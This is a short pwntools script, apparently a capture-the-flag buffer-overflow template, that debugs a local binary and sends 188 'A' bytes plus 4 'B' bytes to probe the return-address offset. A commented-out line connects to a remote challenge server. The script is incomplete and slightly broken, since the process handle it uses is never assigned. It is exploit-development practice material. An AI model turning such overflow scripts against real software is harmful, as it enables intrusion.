from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./file")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


#p = remote("206.189.117.48", 32455)
#p = process("./vuln")
gdb.debug("./vuln", '''
break *main
''')


payload = ""
payload += "A" * 188
payload += "B" * 4

p.sendline(payload)
p.interactive()
